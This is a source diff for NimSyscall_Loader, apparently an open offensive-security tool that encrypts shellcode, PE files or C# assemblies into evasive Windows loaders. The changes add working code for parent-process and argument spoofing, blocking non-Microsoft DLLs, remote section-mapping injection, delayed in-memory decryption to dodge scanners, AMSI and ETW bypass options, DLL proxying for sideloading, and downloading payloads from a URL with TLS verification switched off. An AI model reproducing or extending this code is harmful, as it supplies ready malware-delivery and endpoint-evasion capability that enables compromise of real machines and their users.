@@ -51,7 +51,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.7                                            
+                                                                 v1.75                                            
 
 """
 
@@ -60,10 +60,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.7
+NimSyscall_Loader v 1.75
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -77,7 +77,7 @@ Options:
   --key key     Key to encrypt with
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
-  --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
+  --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
@@ -85,34 +85,39 @@ Options:
   --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode
-  --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --x86    Compiles an x86 binary
+  --wow64    (Compiles a x86 binary that can be by x64 CPUs)
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
 
-[Shellcode retrieval options]
+[Payload retrieval options]
 
-  By default, the Loader will embed the Shellcode into the output file. There are two alternatives to this:  
-  --shellcodeFile shellcodefile    Filename to retrieve shellcode from - on Runtime (No embedding)
-  --shellcodeURL shellcodeURL    URL to retrieve shellcode from
+  By default, the Loader will embed the Payload into the output file. There are two alternatives to this:  
+  --shellcodeFile shellcodefileLocation(s)    Filename to retrieve Payload from - on Runtime (No embedding). The first location will also be the output file location. You can specify multiple locations, separated by a comma.
+  --shellcodeURL shellcodeURL    URL to retrieve Payload from
 
 [DLL options]
 
   --dll     Generate DLL instead of an executable
       --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
       --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
-      --clone value    Specify a local DLL to clone the API-Exports from
+      --noNimMain    Remove NimMain export to avoid this IoC (Use "--dllhijack" in addition to instead export DllMain or alternatively "--dllexportfunc DllMain")
+      --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
+      --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
       --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
 
 [evasion]
 
-  --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
+  --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
+  --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
   --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
   --unhook    Unhook ntdll.dll before doing anything else for the current process
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
+  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/) -> Prevent Loading works, but C# Loading fails for some reason
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
@@ -143,14 +148,20 @@ Options:
 [shellcode specific]
 
   --shellcode    Encrypt shellcode to load it on runtime
+  --CallbackExecute    Execute shellcode via a custom Callback function
   --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
+  --noWait    Don't use 'WaitForSingleObject(-1,-1)' after local Injection but exit the process instead afterwards. If your Shellcode exits the Thread/Process itself, this will not have any effect.
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                          Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
+      --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
+      --parentProcess parentProcName    Name of the parent Process to spoof (PPID Spoofing)
+      --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
       --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
       --remotepatchETW    Patch ETW in the remote process before shellcode execution
-  
+      --remoteMapSection    Map the shellcode into the remote process via MapViewOfSection -> decryption will happen AFTER writing the Shellcode into the remote process
+
 [PE Packing]
 
   --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
@@ -185,14 +196,19 @@ var
     dllhijack: bool = false
     dllclone: bool = false
     dllToClone: string = ""
+    dllProxy: bool = false
+    noNimMain: bool = false
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
-    customspawnprocess: string = "notepad.exe"
-    shellcodeFile: string = "enc.blob"
+    customspawnprocess: string = "RuntimeBroker.exe"
+    parentProcess: string = ""
+    spoofArgs: string = ""
+    shellcodeFile: seq[string] = @["enc.blob"]
+    scfile: string = ""
     retrieveFromFile: bool = false
     shellcodeURL: string = ""
     retrieveFromURL: bool = false
@@ -205,17 +221,22 @@ var
     embeddedArguments : bool = false
     AMSI: bool = true
     AMSIProviderPatch: bool = false
+    AMSICreateSectionHook: bool = false
     ETW: bool = true
     COMVARETW: bool = false
     shellcode: bool = true
+    callbackexecute: bool = false
+    wait: bool = true
     localCreateThread: bool = false
     localinject: bool = true
     unhook: bool = false
     verbose: bool = false
+    blockDLLs: bool = false
     denim: bool = false
     llvm: bool = false
     gosleep: bool = false
     sleeptime: int = 0
+    sleepinbetween: int = 0
     reflective: bool = false
     hide: bool = false
     apiHide: bool = false
@@ -239,14 +260,16 @@ var
     sign: bool = false
     signdomain: string = "www.microsoft.com"
     compileX86: bool = false
+    wow64: bool = false
     noassembly: bool = false
     sleepycrypt: bool = false
     fluctuate: bool = false
     noDInvoke: bool = false
-    noRES: bool = true
+    metadata: bool = false
     antidebug: bool = false
+    remoteMapSection: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.7")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.75")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -267,8 +290,14 @@ if args["--shellcode"]:
   csharp = false
   peload = false
 
+if args["--CallbackExecute"]:
+  callbackexecute = true
+
 if args["--localCreateThread"]:
     localCreateThread = true
+
+if args["--noWait"]:
+    wait = false
 
 if args["--csharp"]:
   csharp = true
@@ -283,11 +312,12 @@ if args["--peload"]:
 if args["--shellcodeFile"]:
     retrieveFromFile = true
     let shellcodeFilestring = args["--shellcodeFile"]
-    shellcodeFile = fmt"{shellcodeFilestring}"
+    scfile = fmt"{shellcodeFilestring}"
+    shellcodeFile = scfile.split(',')
 
 if args["--shellcodeURL"]:
     retrieveFromURL = true
-    shellcodeFile = "WebserverPayload.bin"
+    shellcodeFile = @["WebserverPayload.bin"]
     let shellcodeURLstring = args["--shellcodeURL"]
     shellcodeURL = fmt"{shellcodeURLstring}"
 
@@ -303,6 +333,13 @@ if args["--dllexportfunc"]:
 
 if args["--dllhijack"]:
   dllhijack = true
+
+if args["--dllProxy"]:
+  dllProxy = true
+  dllhijack = true
+
+if args["--noNimMain"]:
+  noNimMain = true
 
 if args["--clone"]:
     dllclone = true
@@ -343,8 +380,8 @@ if args["--output"]:
   let outname = args["--output"]
   outfile = fmt"{outname}"
 
-if args["--noRES"]:
-  noRES = false
+if args["--metadata"]:
+  metadata = true
 
 if args["--remotepatchAMSI"]:
   remoteAMSIpatch = true
@@ -352,11 +389,18 @@ if args["--remotepatchAMSI"]:
 if args["--remotepatchETW"]:
   remoteETWpatch = true
 
+if args["--remoteMapSection"]:
+  remoteMapSection = true
+
 if args["--noAMSI"]:
   AMSI = false
 
 if args["--AMSIProviderPatch"]:
   AMSIProviderPatch = true
+  AMSI = false
+
+if args["--AMSINtCreateSectionHook"]:
+  AMSICreateSectionHook = true
   AMSI = false
 
 if args["--noETW"]:
@@ -376,12 +420,28 @@ if args["--sleep"]:
   sleeptime = (sleeptime)
   gosleep = true
 
+if args["--sleep-in-between"]:
+    sleepinbetween = parse_int($args["--sleep-in-between"])
+    sleepinbetween = (sleepinbetween)
+    gosleep = true
+    
 if args["--remoteinject"]:
   localinject = false
+
+if args["--blockDLLs"]:
+    blockDLLs = true
 
 if args["--customprocess"]:
   let customprocargs = args["--customprocess"]
   customspawnprocess = fmt"{customprocargs}"
+
+if args["--spoofArgs"]:
+  let customSpoofArgs = args["--spoofArgs"]
+  spoofArgs = fmt"{customSpoofArgs}"
+
+if args["--parentProcess"]:
+    let parProc = args["--parentProcess"]
+    parentProcess = fmt"{parProc}"
 
 if args["--remoteprocess"]:
   let remoteprocessesstring = args["--remoteprocess"]
@@ -473,6 +533,12 @@ if args["--antidebug"]:
 
 if args["--x86"]:
   compileX86 = true
+  noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.
+
+if args["--wow64"]:
+    wow64 = true
+    compileX86 = true
+    noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.
 
 if args["--verbose"]:
   verbose = true
@@ -481,6 +547,22 @@ if args["--noDInvoke"]:
   noDInvoke = true
 
 var blob: string
+
+if ((compileX86 or wow64) and hellsgate):
+    echo "Error: Hellsgate is not supported for x86 yet"
+    if (wow64):
+        echo "Only syswhispers (without Jump) supports wow64 till now"
+    quit(1)
+
+if (wow64 and syswhispers and jump):
+    echo "Error: Syswhispers (Jump) cannot be used in combination with wow64"
+    quit(1)
+
+if (wow64 and getfreshstub):
+    echo "Error: GetSyscallStub cannot be used in combination with wow64 yet"
+    if (wow64):
+        echo "Only Syswhispers (without Jump) supports wow64 till now"
+    quit(1)
 
 if (noArgs and embeddedArguments):
     echo "Error: Cannot use both --noArgs and --arguments"
@@ -540,6 +622,10 @@ else:
         var newPath = packerPath & "/pwnPowershell/RunSpace.exe"
         blob = readFile(newPath)
 
+if (AMSICreateSectionHook):
+    echo "Not fully working yet, sorry!"
+    quit(0)
+
 #Read file and if PE convert to shellcode before
 if (peinject):
     when system.hostOS == "windows":
@@ -559,12 +645,12 @@ if (peinject):
                     discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                 sgn = false
         elif system.hostOS == "linux":
-            discard os.execShellCmd(fmt"donut {filename} -b 1 -o tmpshellcode.bin")
+            discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin")
             if (sgn):
                 if (compileX86):
-                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                    discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                 else:
-                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                    discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                 sgn = false
         blob = readFile("tmpshellcode.bin")
         shellcode = true
@@ -628,7 +714,7 @@ ectx.clear()
 echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
-writeFile(shellcodeFile, content)
+writeFile(shellcodeFile[0], content)
 
 proc getRandStub (): string =
   var randName: string = rndStr(rand(10..25))
@@ -730,6 +816,12 @@ from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
 let LoadAssemblyStub = fmt"""
+
+# Actually decrypt after doing everything else for better evasion.
+ptrEncText = cast[ptr byte](addr enctext[0])
+ptrDecText = cast[ptr byte](addr dectext[0])
+decryptlate()
+
 var assembly = load(dectext)
 
 from os import paramCount,paramStr
@@ -814,15 +906,26 @@ var remoteprocesses: seq[string] = {remoteprocesses}
 let ShellcodeFromFileStub * = fmt"""
 
 var fileHandle: File
-fileHandle = open("{shellcodeFile}", fmRead)
-var encString = fileHandle.readAll()
+var encString: string
+for f in {shellcodeFile}:
+    try:
+        fileHandle = open(f, fmRead)
+        encString = fileHandle.readAll()
+        break
+    except:
+        when defined(verbose):
+            echo obf("[-] Failed to open file: ") & f
 
 """
 
 let ShellcodeFromURLStub * = fmt"""
 
+import std/net
 import std/httpclient
-var client = newHttpClient()
+when defined(ssl):
+    var client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
+else:
+    var client = newHttpClient()
 var encString = client.getContent("{shellcodeURL}")
 
 """
@@ -886,11 +989,15 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-var ectx: ECB[aes256]
+var dctx: ECB[aes256]
 
 """
 
 let Cryptstub2 = fmt"""
+
+when defined(sleepinbetween):
+    var sleepbetweentime: int = {sleepinbetween}
+
 var enctext: seq[byte] = toByteSeq(encstring)
 var key: array[aes256.sizeKey, byte]
 var envkey: string = obf("{envkey}")
@@ -910,10 +1017,23 @@ if ((len(expandedkey) mod aes256.sizeBlock) != 0):
 
 copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
 var dectext = newSeq[byte](len(enctext))
+
+var ptrKey = cast[ptr byte](addr key[0])
+var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
+var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
+let dataLen = uint(len(enctext))
+
 # Decrypt
-ectx.init(key)
-ectx.decrypt(enctext, dectext)
-ectx.clear()
+#dctx.init(ptrKey)
+#dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+#dctx.clear()
+
+proc decryptLate(): void =
+    when defined(verbose):
+        echo obf("[!] Decrypting Shellcode for execution in memory")
+    dctx.init(ptrKey)
+    dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+    dctx.clear()
 
 """
 
@@ -1177,15 +1297,123 @@ SleepyCryptLoop(10000)
 """
 
 let NotepadProcIDStub * = fmt"""
-import osproc
-# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
-let tProcess = startProcess(obf("{customspawnprocess}"))
-tProcess.suspend() # That's handy!
-tProcess.close()
+import os
+
+from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+
+proc FindPidByName * (processName : string):DWORD =
+    try:
+        var 
+            entry : PROCESSENTRY32A
+            snapshot : HANDLE
+            pid : DWORD = 0
+        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snapshot != INVALID_HANDLE_VALUE:
+            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
+            if Process32FirstA(snapshot,addr entry):
+                while Process32NextA(snapshot,addr entry):
+                    pid = entry.th32ProcessID
+                    if ($(entry.szExeFile).join()).contains(processName):
+                        result = pid
+    except: 
+        echo obf("Process ID not found")
+
+var remoteProcID: DWORD
+
+proc StartProcess(): void =
+    var 
+        lpSize: SIZE_T
+        tProcess: HANDLE
+        pi: PROCESS_INFORMATION
+        ps: SECURITY_ATTRIBUTES
+        si: STARTUPINFOEX
+        status: WINBOOL
+        tHandle: HANDLE
+        tProcPath: WideCString
+        ts: SECURITY_ATTRIBUTES
+    
+    ps.nLength = sizeof(ps).cint
+    ts.nLength = sizeof(ts).cint
+    si.StartupInfo.cb = sizeof(si).cint
+
+
+    when defined spoof_args:
+        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
+    else:
+        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
+
+    when defined(blockDLLs) or (obf("{parentProcess}") != ""):
+        InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+
+        when defined(blockDLLs):
+            const
+                PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
+            var
+                policy: DWORD64
+
+            policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+            
+            status = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                0,
+                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                addr policy,
+                sizeof(policy),
+                NULL,
+                NULL)
+
+        if (obf("{parentProcess}") != ""):
+            var
+                ppHandle: HANDLE
+                ppid: DWORD
+
+            ppid = FindPidByName(obf("{parentProcess}"))                    
+            ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
+            
+            if (ppHandle == 0):
+              when defined(verbose):
+                echo obf("Failed to open parent process handle, no permissions??")
+              ppHandle = HANDLE(-1) # Current Process
+
+            status = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                0,
+                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+                addr ppHandle,
+                sizeof(ppHandle),
+                NULL,
+                NULL)
+
+    status = CreateProcess(
+        NULL,
+        tProcPath,
+        ps,
+        ts, 
+        FALSE,
+        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
+        NULL,
+        r"C:\Windows\system32\",
+        addr si.StartupInfo,
+        addr pi)
+
+    tProcess = pi.hProcess
+    remoteProcID = pi.dwProcessId
+    tHandle = pi.hThread
+
+StartProcess()
+
 
 when defined(verbose):
-    echo obf("[*] Target Process: "), tProcess.processID
-var remoteProcID = DWORD(tProcess.processID)
+    echo obf("[*] Sleeping in between for: "), {sleepinbetween}
+
+when defined(sleepinbetween):
+    HowMuchTimeWouldYouLikeToSleep({sleepinbetween})
+
+when defined(verbose):
+    echo obf("[*] Target Process: "), remoteProcID
+
 
 """
 
@@ -1253,9 +1481,15 @@ if (getfreshstub):
 
 if (syswhispers):
     if(jump):
-        stub.add(WhispersJumpStub)
+        if (not compileX86):
+            stub.add(WhispersJumpStub)
+        else:
+            stub.add(WhispersJumpStubX86)
     else:
-        stub.add(WhispersStub)
+        if (not compileX86):
+            stub.add(WhispersStub)
+        else:
+            stub.add(WhispersStubX86)
 
 stub.add(getRandStub())
 
@@ -1318,6 +1552,8 @@ if (localinject):
         stub.add(AMSIStub)
     elif(AmsiProviderPatch):
         stub.add(AMSIProviderPatchStub)
+    elif(AMSICreateSectionHook):
+        stub.add(AMSINtCreateSectionHookStub)
     if (ETW):
         if (COMVARETW):
             stub.add(ETWCOMVARStub)
@@ -1381,7 +1617,10 @@ if (peload):
                     stub.add(RemoteLoadAMSIStub)
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
-            stub.add(ShellcoderemoteinjectStub)
+            if (remoteMapSection):
+                stub.add(ShellcodeRemoteInjectMapSection)
+            else:
+                stub.add(ShellcoderemoteinjectStub)
             stub.add(getRandStub())
             stub.add(getRandStub())
 
@@ -1482,8 +1721,10 @@ if (shellcode):
                     stub.add(RemoteLoadAMSIStub)
                     stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
-            
-        stub.add(ShellcoderemoteinjectStub)
+        if (remoteMapSection):
+            stub.add(ShellcodeRemoteInjectMapSection)
+        else:
+            stub.add(ShellcoderemoteinjectStub)
         stub.add(getRandStub())
 
 if (csharp):
@@ -1514,7 +1755,28 @@ if (debugMode):
     stub = stub.replace("import strenc", "")
 
 writeFile("Loader.nim", stub)
-echo "Written Loader.nim, compiling -> \n\n"
+echo "Written Loader.nim -> \n\n"
+
+var randValue: string = rndStr(8)
+if(dllProxy):
+    # No Support for multiple DLL files at the moment. So the last one found will be used.
+    var paths: seq[string] = @[]
+    when system.hostOS == "windows":
+        for path in walkFiles(fmt"{packerpath}\\build\\*.dll"):
+            paths.add path
+    else:
+        for path in walkFiles(fmt"{packerpath}/build/*.dll"):
+            paths.add path
+    if paths == @[]:
+        echo fmt"No DLL files found in the {packerpath}/build/ folder. You need to put the legit DLL to proxy into this directory. Exiting..."
+        quit(1)
+    for dllpath in paths:
+        when system.hostOS == "windows":
+            echo os.execShellCmd(fmt"copy {dllpath} {packerpath}\\{randValue}.dll")
+            echo os.execShellCmd(fmt"{packerpath}\\dllProxy\\gen_def.exe {randValue}.dll > {packerpath}/build/{randValue}.def")
+        else:
+            echo exec_cmd_ex(fmt"cp {dllpath} {packerpath}/{randValue}.dll")
+            echo exec_cmd_ex(fmt"python {packerpath}/dllProxy/gen_def.py {randValue}.dll > {packerpath}/build/{randValue}.def")
 
 
 # --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
@@ -1560,9 +1822,36 @@ elif system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
+if(dllProxy):
+    when system.hostOS == "windows":
+        basicCompileFlags.add(fmt" --passl:{packerpath}\\build\\{randValue}.def ")
+    else:
+        basicCompileFlags.add(fmt" --passl:{packerpath}/build/{randValue}.def ")
+
 if(denim):
     basicCompileFlags.add("-d:denim ")
 
+if(callbackexecute):
+    basicCompileFlags.add("-d:Callback ")
+
+if(wait):
+    basicCompileFlags.add("-d:wait ")
+
+if(blockDLLs):
+    basicCompileFlags.add("-d:blockDLLs ")
+
+if (noNimMain):
+    when system.hostOS == "windows":
+        basicCompileFlags.add(fmt"--passl:{packerPath}\\dllProxy\nonimmain.def ")
+    else:
+        basicCompileFlags.add(fmt"--passl:{packerPath}/dllProxy/nonimmain.def ")
+
+if (retrieveFromURL):
+    if(shellcodeURL.contains("https")):
+        basicCompileFlags.add("-d:ssl ")
+    elif(not shellcodeURL.contains("http")):
+        echo "[!] URL must contain http:// or https://"
+        quit()
 
 if(hellsgate):
     basicCompileFlags.add("-d:Hellsgate ")
@@ -1583,7 +1872,7 @@ if embeddedArguments:
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
-if (noRES):
+if (metadata and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
     if (dll_out or cpl):
         when system.hostOS == "windows":
             basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
@@ -1601,8 +1890,17 @@ if(fluctuate):
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
 
+if (wow64):
+    basicCompileFlags.add("-d:wow64 ")
+
 if not noDInvoke:
     basicCompileFlags.add("-d:DInvoke ")
+
+if (spoofArgs != ""):
+    basicCompileFlags.add(fmt"-d:spoof_args ")
+
+if (sleepinbetween > 0):
+    basicCompileFlags.add(fmt"-d:sleepinbetween ")
 
 if localCreateThread:
     basicCompileFlags.add("-d:LocalCreateThread ")
@@ -1703,9 +2001,10 @@ if(dll_out):
         else:
             discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
 
-let msg = fmt"[!] Encrypted file saved to {outfile}"
+let msg = fmt"[!] Loader saved to {outfile}"
 echo "\n" & msg
-
+if(retrieveFromFile):
+    echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
 if (callobfs):
     when system.hostOS == "windows":
         var outfileonlyname = outfile.replace(packerPath, "")
@@ -1758,4 +2057,7 @@ if (pump):
             writeFile(fmt"{outfile}",pumpsequence)
 
 if (retrieveFromURL):
-    echo fmt"[!] Make sure to host the {shellcodeFile} file on your webserver with the correct file-Name to have a working payload ;-)"
+    echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
+
+if (dllProxy):
+    echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
